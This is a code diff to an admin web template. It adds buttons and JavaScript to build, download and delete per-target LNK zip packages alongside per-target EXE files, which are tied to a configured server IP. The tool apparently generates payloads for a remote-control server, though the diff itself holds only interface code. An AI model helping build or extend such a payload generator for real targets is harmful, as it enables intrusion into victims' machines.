@@ -39,17 +39,21 @@
         <div class="card-head-actions">
             <button class="btn btn-secondary btn-sm" type="button" onclick="batchBuild()" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
                 <svg class="icon" aria-hidden="true"><use href="#i-zap"></use></svg>
-                批量生成
+                批量生成 EXE
+            </button>
+            <button class="btn btn-secondary btn-sm" type="button" onclick="batchBuildLnk()" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
+                <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                批量生成 LNK
             </button>
             <button class="btn btn-danger btn-sm" type="button" onclick="batchDelete()">
                 <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
                 批量删除
             </button>
             <form class="inline-form" action="{{ url_for('routes_web.delete_all_exe') }}" method="POST"
-                  data-confirm="确认删除所有已生成的 EXE 文件？此操作不可撤销。" data-confirm-danger data-confirm-ok="删除">
+                  data-confirm="确认删除所有已生成的 EXE 与 LNK 压缩包？此操作不可撤销。" data-confirm-danger data-confirm-ok="删除">
                 <button class="btn btn-ghost btn-sm danger-text" type="submit">
                     <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
-                    清除所有 EXE
+                    清除所有生成文件
                 </button>
             </form>
         </div>
@@ -119,6 +123,13 @@
                                     {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
                                 {% if t.exe_exists %}重新生成{% else %}生成 EXE{% endif %}
                             </button>
+                            <button id="btn-lnk-{{ t.id }}" class="btn btn-secondary btn-sm" type="button"
+                                    data-default-label="{% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}"
+                                    onclick="buildLnkPackage({{ t.id }})"
+                                    {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
+                                <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                                {% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}
+                            </button>
                             <span id="exe-actions-{{ t.id }}" class="row-actions" {% if not t.exe_exists %}style="display:none;"{% endif %}>
                                 <a id="btn-dl-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_web.download_exe_from_target', target_id=t.id) }}" title="下载 EXE">
                                     <svg class="icon" aria-hidden="true"><use href="#i-download"></use></svg>
@@ -126,6 +137,17 @@
                                 <form class="inline-form" action="{{ url_for('routes_web.delete_exe_from_target', target_id=t.id) }}" method="POST"
                                       data-confirm="确认删除该目标的 EXE 文件？" data-confirm-danger data-confirm-ok="删除">
                                     <button class="btn btn-ghost btn-sm danger-text" type="submit" title="删除该目标的 EXE">
+                                        <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
+                                    </button>
+                                </form>
+                            </span>
+                            <span id="lnk-actions-{{ t.id }}" class="row-actions" {% if not t.lnk_exists %}style="display:none;"{% endif %}>
+                                <a id="btn-dl-lnk-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_web.download_lnk_from_target', target_id=t.id) }}" title="下载 LNK 压缩包">
+                                    <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                                </a>
+                                <form class="inline-form" action="{{ url_for('routes_web.delete_lnk_from_target', target_id=t.id) }}" method="POST"
+                                      data-confirm="确认删除该目标的 LNK 压缩包？" data-confirm-danger data-confirm-ok="删除">
+                                    <button class="btn btn-ghost btn-sm danger-text" type="submit" title="删除该目标的 LNK 压缩包">
                                         <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
                                     </button>
                                 </form>
@@ -242,6 +264,53 @@ function batchBuild() {
         });
 }
 
+function batchBuildLnk() {
+    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
+    var ids = getCheckedIds();
+    if (ids.length === 0) {
+        notify('请先选择目标', 'error');
+        return;
+    }
+
+    ids.forEach(function (id) {
+        var btn = document.getElementById('btn-lnk-' + id);
+        if (btn && !btn.disabled) {
+            btn.disabled = true;
+            btn.textContent = '打包中…';
+        }
+    });
+
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '{{ admin_path }}/targets/batch_build_lnk';
+    ids.forEach(function (id) {
+        var input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'ids[]';
+        input.value = id;
+        form.appendChild(input);
+    });
+    document.body.appendChild(form);
+
+    fetch(form.action, { method: 'POST', body: new FormData(form) })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+            if (data.status !== 'ok') {
+                notify('批量生成失败: ' + (data.message || '请求被拒绝'), 'error');
+                ids.forEach(function (id) {
+                    var btn = document.getElementById('btn-lnk-' + id);
+                    if (btn) btn.disabled = false;
+                });
+                return;
+            }
+            notify(data.message || '已生成 LNK 包', 'success');
+            setTimeout(function () { location.reload(); }, 800);
+        })
+        .catch(function () {
+            notify('批量生成 LNK 请求失败', 'error');
+        });
+}
+
 function buildExe(targetId) {
     {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
     var genBtn = document.getElementById('btn-gen-' + targetId);
@@ -264,6 +333,32 @@ function buildExe(targetId) {
             notify('生成请求失败', 'error');
             genBtn.disabled = false;
             genBtn.textContent = defaultLabel;
+        });
+}
+
+function buildLnkPackage(targetId) {
+    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
+    var btn = document.getElementById('btn-lnk-' + targetId);
+    var defaultLabel = btn.getAttribute('data-default-label') || '生成 LNK';
+    btn.disabled = true;
+    btn.textContent = '打包中…';
+
+    fetch('{{ admin_path }}/targets/' + targetId + '/build_lnk', { method: 'POST' })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+            if (data.status !== 'ok') {
+                notify('生成失败: ' + (data.message || '未知错误'), 'error');
+                btn.disabled = false;
+                btn.textContent = defaultLabel;
+            } else {
+                notify(data.message || 'LNK 包已生成', 'success');
+                setTimeout(function () { location.reload(); }, 700);
+            }
+        })
+        .catch(function () {
+            notify('生成 LNK 包请求失败', 'error');
+            btn.disabled = false;
+            btn.textContent = defaultLabel;
         });
 }
 
